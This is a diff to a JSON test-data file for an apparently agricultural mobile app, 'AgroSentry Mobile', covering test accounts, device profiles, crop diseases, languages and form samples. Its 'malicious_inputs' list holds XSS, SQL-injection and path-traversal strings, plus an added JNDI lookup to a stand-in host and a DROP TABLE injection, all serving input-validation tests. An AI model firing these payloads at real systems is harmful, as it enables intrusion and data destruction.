@@ -1,4 +1,11 @@
 {
+  "app_metadata": {
+    "app_name": "AgroSentry Mobile",
+    "package": "com.agrosentry.mobile",
+    "version": "1.0.0+1",
+    "min_sdk": 21,
+    "target_sdk": 34
+  },
   "credentials": {
     "admin": {
       "email": "mahiworkmail6@gmail.com",
@@ -10,20 +17,31 @@
       "email": "farmer.test@agrosentry.org",
       "password": "SecurePassword123!",
       "name": "Ramesh Kumar",
-      "role": "farmer"
+      "role": "farmer",
+      "farm_location": "Hyderabad, Telangana",
+      "farm_size": "5.5 Acres"
     },
     "invalid_users": [
       { "email": "wrong.user@agrosentry.org", "password": "WrongPassword99!" },
       { "email": "nonexistent@fake.io", "password": "DummyPass123$" }
     ]
   },
+  "mobile_devices": [
+    { "name": "Pixel 6 Pro", "width": 1440, "height": 3120, "density": 560, "os": "Android 13" },
+    { "name": "Pixel 7", "width": 1080, "height": 2400, "density": 420, "os": "Android 14" },
+    { "name": "Samsung Galaxy S22", "width": 1080, "height": 2340, "density": 425, "os": "Android 13" },
+    { "name": "Xiaomi Redmi Note 11", "width": 1080, "height": 2400, "density": 395, "os": "Android 12" },
+    { "name": "Budget 720p Device", "width": 720, "height": 1600, "density": 270, "os": "Android 11" }
+  ],
   "malicious_inputs": [
     "<script>alert('xss')</script>",
     "' OR '1'='1' --",
     "admin' --",
     "\" OR \"\"=\"",
     "../../../../etc/passwd",
-    "javascript:void(0)"
+    "javascript:void(0)",
+    "${jndi:ldap://malicious.host/exp}",
+    "; DROP TABLE users; --"
   ],
   "boundary_passwords": {
     "too_short": "123",
@@ -31,17 +49,6 @@
     "no_number": "Abcdefgh!",
     "no_special": "Abcdefgh1"
   },
-  "viewports": [
-    { "name": "Desktop 4K", "width": 3840, "height": 2160 },
-    { "name": "Desktop Full HD", "width": 1920, "height": 1080 },
-    { "name": "Desktop HD", "width": 1366, "height": 768 },
-    { "name": "Laptop", "width": 1440, "height": 900 },
-    { "name": "Tablet Landscape", "width": 1024, "height": 768 },
-    { "name": "Tablet Portrait", "width": 768, "height": 1024 },
-    { "name": "Mobile Large", "width": 414, "height": 896 },
-    { "name": "Mobile Standard", "width": 375, "height": 812 },
-    { "name": "Mobile Small", "width": 320, "height": 568 }
-  ],
   "crops": [
     "Tomato",
     "Potato",
@@ -50,17 +57,41 @@
     "Rice",
     "Wheat",
     "Grape",
-    "Pepper Bell"
+    "Pepper Bell",
+    "Cotton",
+    "Sugarcane"
   ],
   "diseases": [
-    "Tomato Early Blight",
-    "Tomato Late Blight",
-    "Tomato Yellow Leaf Curl",
-    "Potato Early Blight",
-    "Potato Late Blight",
-    "Corn Common Rust",
-    "Apple Black Rot",
-    "Pepper Bacterial Spot"
+    { "crop": "Tomato", "name": "Tomato Early Blight", "pathogen": "Alternaria solani", "severity": "Moderate" },
+    { "crop": "Tomato", "name": "Tomato Late Blight", "pathogen": "Phytophthora infestans", "severity": "Severe" },
+    { "crop": "Tomato", "name": "Tomato Yellow Leaf Curl", "pathogen": "Begomovirus", "severity": "High" },
+    { "crop": "Potato", "name": "Potato Early Blight", "pathogen": "Alternaria solani", "severity": "Moderate" },
+    { "crop": "Potato", "name": "Potato Late Blight", "pathogen": "Phytophthora infestans", "severity": "Severe" },
+    { "crop": "Corn", "name": "Corn Common Rust", "pathogen": "Puccinia sorghi", "severity": "Low" },
+    { "crop": "Apple", "name": "Apple Black Rot", "pathogen": "Botryosphaeria obtusa", "severity": "High" },
+    { "crop": "Pepper Bell", "name": "Pepper Bacterial Spot", "pathogen": "Xanthomonas", "severity": "Moderate" }
   ],
-  "languages": ["en", "hi", "te", "ta", "kn", "es", "fr"]
+  "languages": [
+    { "code": "en", "name": "English", "locale": "en_US" },
+    { "code": "hi", "name": "हिन्दी (Hindi)", "locale": "hi_IN" },
+    { "code": "te", "name": "తెలుగు (Telugu)", "locale": "te_IN" },
+    { "code": "ta", "name": "தமிழ் (Tamil)", "locale": "ta_IN" },
+    { "code": "kn", "name": "ಕನ್ನಡ (Kannada)", "locale": "kn_IN" },
+    { "code": "es", "name": "Español", "locale": "es_ES" },
+    { "code": "fr", "name": "Français", "locale": "fr_FR" }
+  ],
+  "form_plot_samples": [
+    { "name": "North Field Tomato", "crop": "Tomato", "acreage": "3.5", "ph": "6.8", "irrigation": "Drip" },
+    { "name": "South Orchard Apple", "crop": "Apple", "acreage": "8.0", "ph": "6.2", "irrigation": "Sprinkler" },
+    { "name": "West Basin Potato", "crop": "Potato", "acreage": "2.2", "ph": "5.9", "irrigation": "Flood" }
+  ],
+  "search_queries": [
+    "blight", "rust", "yellow leaf", "organic fungicide", "nitrogen deficiency",
+    "aphids", "powdery mildew", "bacterial spot", "leaf curl", "root rot"
+  ],
+  "filter_categories": [
+    { "type": "crop", "values": ["Tomato", "Potato", "Corn", "Apple", "Rice"] },
+    { "type": "severity", "values": ["Low", "Moderate", "High", "Critical"] },
+    { "type": "treatment_type", "values": ["Organic", "Chemical", "Biological", "Cultural"] }
+  ]
 }
